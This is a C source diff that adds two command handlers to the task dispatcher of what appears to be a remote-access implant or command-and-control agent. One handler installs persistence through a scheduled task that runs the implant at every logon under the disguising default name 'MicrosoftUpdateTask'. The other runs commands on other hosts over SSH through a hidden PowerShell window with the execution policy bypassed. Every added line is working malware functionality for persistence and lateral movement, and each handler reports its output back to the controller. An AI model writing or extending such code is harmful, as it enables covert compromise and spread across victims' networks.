@@ -1662,6 +1662,43 @@ void dispatch_task(AgentTask *task) {
         char *out = run_shell(shell_cmd);
         agent_send_result(task->id, out, ""); free(out);
     }
+    else if (strcmp(type_upper, "PERSIST_TASK") == 0) {
+        /* Args: optional task name (defaults to MicrosoftUpdateTask) */
+        char name[128] = "MicrosoftUpdateTask";
+        if (args && args[0]) strncpy(name, args, sizeof(name)-1);
+        /* Get own executable path */
+        char self_path[MAX_PATH] = {0};
+        GetModuleFileNameA(NULL, self_path, sizeof(self_path));
+        char shell_cmd[1024] = {0};
+        snprintf(shell_cmd, sizeof(shell_cmd),
+            "schtasks /create /tn \"%s\" /tr \"%s\" /sc ONLOGON /f 2>&1",
+            name, self_path);
+        char *out = run_shell(shell_cmd);
+        agent_send_result(task->id, out ? out : "", ""); free(out);
+    }
+    else if (strcmp(type_upper, "SSH_EXEC") == 0) {
+        char host[256]={0}, user[128]={0}, pass[256]={0}, cmd2[1024]={0};
+        int  port = json_get_int(args, "port", 22);
+        json_get_str(args, "host", host, sizeof(host), "");
+        json_get_str(args, "user", user, sizeof(user), "");
+        json_get_str(args, "pass", pass, sizeof(pass), "");
+        json_get_str(args, "cmd",  cmd2, sizeof(cmd2), "");
+        if (!host[0] || !user[0] || !cmd2[0]) {
+            agent_send_result(task->id, "", "SSH_EXEC: {host,user,cmd} required"); return;
+        }
+        /* Use PowerShell Invoke-Command -HostName (requires Win10 1809+ OpenSSH) */
+        char ps_buf[2048];
+        snprintf(ps_buf, sizeof(ps_buf),
+            "$pw=ConvertTo-SecureString '%s' -AsPlainText -Force;"
+            "$cred=New-Object PSCredential('%s',$pw);"
+            "Invoke-Command -HostName %s -Port %d -UserName %s -ScriptBlock {%s} 2>&1",
+            pass, user, host, port, user, cmd2);
+        char sh_cmd[3072];
+        snprintf(sh_cmd, sizeof(sh_cmd),
+            "powershell -NoP -W Hidden -Exec Bypass -C \"%s\"", ps_buf);
+        char *out = run_shell(sh_cmd);
+        agent_send_result(task->id, out ? out : "", ""); free(out);
+    }
     else if (strcmp(type_upper, "REG_QUERY") == 0) {
         char cmd2[512]; snprintf(cmd2,sizeof(cmd2),"reg query \"%s\" 2>&1",args);
         char *out = run_shell(cmd2); agent_send_result(task->id, out, ""); free(out);
